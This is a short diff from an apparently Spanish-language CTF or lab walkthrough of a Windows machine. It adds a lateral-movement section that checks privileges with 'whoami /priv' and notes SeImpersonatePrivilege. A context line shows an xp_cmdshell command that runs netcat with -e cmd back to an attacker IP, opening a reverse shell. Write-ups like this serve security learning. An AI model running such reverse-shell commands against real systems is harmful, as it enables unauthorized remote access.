@@ -270,4 +270,12 @@ xp_cmdshell "C:\Temp\netcat.exe -e cmd 10.10.15.165 443"
 
 Obteniendo una shell en nuestra maquina atacante como el usuario `sqlsvc`, viendo el directorio `Users` observamos que hay otro usuario llamado `miscsvc`
 
+# Escalda
+## Movimiento lateral sqlsvc -> miscsvc
 
+Lo primero que tenemos que realizar es enumerar los privilegios de nuestro usuario
+```shell
+whoami /priv
+```
+
+Vemos que tiene habilitado el `SeImpersonatePrivilege` 
